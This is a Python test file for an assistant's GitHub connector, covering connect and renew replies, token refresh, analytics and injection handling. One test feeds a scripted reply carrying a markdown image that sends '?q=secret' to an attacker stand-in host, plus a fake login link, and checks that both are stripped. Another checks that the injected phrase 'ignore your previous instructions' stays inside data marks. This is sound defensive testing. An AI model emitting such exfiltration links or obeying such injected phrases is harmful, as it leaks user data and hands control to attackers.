"""The connector route's answer end to end (spec 023 US2, US3): the store, the fake GitHub, the loop and the link
check, with a scripted model. Not connected, or needing renewal: a fixed reply and no model call (FR-012)."""

from datetime import UTC, datetime
from unittest.mock import MagicMock

import pytest
from cryptography.fernet import Fernet

from indico_assistant.models import Connection
from indico_assistant.services.connectors import github, loop, store
from indico_assistant.services.connectors.fake_github import EVIL, FakeGitHub

SETTINGS = {"github_enabled": True, "github_client_id": "Iv1.fake", "github_client_secret": "fake-secret",
            "timeout_seconds": 30}
BASE = "http://indico.test"
PROFILE = f"{BASE}/user/assistant-connections/"
PR16 = "https://github.com/thoth-labs/indico-assistant/pull/16"


class Script:
    def __init__(self, *steps):
        self.steps, self.prompts = list(steps), []

    def generate(self, prompt, response_model, **kwargs):
        self.prompts.append(prompt)
        return MagicMock(success=True, result=self.steps.pop(0)(response_model))


def use(name, **arguments):
    return lambda model: model(call={"tool": name, **arguments})


def say(text):
    return lambda model: model(reply=text) if "reply" in model.model_fields else model(answer=text)


@pytest.fixture
def fake(tmp_path, monkeypatch):
    fake = FakeGitHub(tmp_path / "fake.json")
    monkeypatch.setattr(github, "_transport", fake.transport)
    monkeypatch.setenv(store.KEY_ENV, Fernet.generate_key().decode())
    return fake


@pytest.fixture
def makoto(create_user):
    return create_user(21, first_name='Makoto')


def connect(db, user):
    app = github.app_for(SETTINGS)
    tokens = app.exchange("fake-code", "v", "https://cb")
    store.save(user.id, "github", app.account(tokens.access), tokens)
    db.session.flush()


def ask(user, llm, message="which of my PRs are open?"):
    return loop.answer(user.id, message, [], llm=llm, settings=SETTINGS, base_url=BASE, profile_url=PROFILE)


def test_not_connected_gets_the_connect_link_and_no_model_call(db, makoto, fake):
    llm = MagicMock()
    result = ask(makoto, llm)
    assert f"[Connect GitHub]({PROFILE})" in result.text and result.tools == [] and not result.failed
    llm.generate.assert_not_called()


def test_a_connection_github_refuses_gets_the_renew_link(db, makoto, fake):
    connect(db, makoto)
    Connection.query.filter_by(user_id=makoto.id).one().access_expires_at = datetime.now(UTC)
    fake.refuse_refresh()
    llm = MagicMock()
    result = ask(makoto, llm)
    assert f"[Connect it again]({PROFILE})" in result.text and "no longer accepts" in result.text
    llm.generate.assert_not_called()


def test_a_connected_user_gets_the_answer_with_only_githubs_own_links(db, makoto, fake):
    connect(db, makoto)
    llm = Script(use("my_pull_requests"), say(
        f"Open: [#16]({PR16}), and [#99](https://github.com/thoth-labs/indico-assistant/pull/99). "
        f"![status]({EVIL}?q=secret) [verify]({EVIL}/login)"))
    result = ask(makoto, llm)
    assert f"[#16]({PR16})" in result.text and "#99" in result.text and "/pull/99" not in result.text
    assert EVIL not in result.text and "verify" in result.text and "![" not in result.text
    assert result.tools[0]["name"] == "my_pull_requests" and result.tools[0]["ok"]
    assert "<github_data>" in llm.prompts[1] and "#16 thoth-labs/indico-assistant" in llm.prompts[1]
    assert Connection.query.filter_by(user_id=makoto.id).one().last_used_at is not None


def test_injected_text_reaches_the_model_only_inside_the_mark(db, makoto, fake):
    connect(db, makoto)
    llm = Script(use("item", repo="thoth-labs/indico-assistant", number=8), say("It's about the timezone."))
    ask(makoto, llm, "what's issue 8 in indico-assistant about?")
    prompt = llm.prompts[1]
    injected = prompt.index("ignore your previous instructions")
    assert prompt.index("<github_data>") < injected < prompt.index("</github_data>")


def test_a_grant_revoked_on_github_gets_the_renew_reply_and_is_marked(db, makoto, fake):
    """(Copilot, PR #17) the stored token looks fresh, but GitHub refuses it (401)."""
    connect(db, makoto)
    for token in list(fake.state["tokens"]):
        fake.expire(token)
    result = ask(makoto, Script(use("my_pull_requests")))
    assert "[Connect it again]" in result.text and result.tools[0]["ok"] is False
    assert Connection.query.filter_by(user_id=makoto.id).one().needs_renewal


def test_github_unreachable_on_refresh_gets_a_try_again_reply(db, makoto, fake):
    connect(db, makoto)
    Connection.query.filter_by(user_id=makoto.id).one().access_expires_at = datetime.now(UTC)
    fake.fail_next("/login/oauth/access_token", 502)
    llm = MagicMock()
    assert "try again" in ask(makoto, llm).text
    llm.generate.assert_not_called()
    assert not Connection.query.filter_by(user_id=makoto.id).one().needs_renewal


def test_an_earlier_connector_answers_github_links_stay_links(db, makoto, fake):
    """(third review) the history holds only connector answers, already checked: their items may be linked again."""
    connect(db, makoto)
    history = [{"role": "user", "content": "my open PRs?"}, {"role": "assistant", "content": f"[#16]({PR16})"}]
    llm = Script(use("item", repo="thoth-labs/indico-assistant", number=8), say(f"Unlike [#16]({PR16}), #8 is a bug."))
    result = loop.answer(makoto.id, "and issue 8?", history, llm=llm, settings=SETTINGS, base_url=BASE,
                         profile_url=PROFILE)
    assert f"[#16]({PR16})" in result.text


def test_each_lookup_is_an_analytics_step_without_its_content(db, makoto, fake):
    """Spec 024 (FR-009): the turn records each tool's name, time and outcome, and never what it read."""
    from indico_assistant.services.analytics import recorder

    connect(db, makoto)
    turn = recorder._Turn(1, text_on=True)
    token = recorder._current.set(turn)
    try:
        recorder.private()  # (the chat service marks a connector turn private before the loop runs)
        result = ask(makoto, Script(use("my_pull_requests"), say(f"Open: [#16]({PR16}).")))
    finally:
        recorder._current.reset(token)
    assert result.stop == "answered"
    assert [(s.kind, s.stage, s.name, s.ok) for s in turn.steps] == [("tool", "github", "my_pull_requests", True)]
    assert turn.steps[0].duration_ms is not None and turn.texts == {}
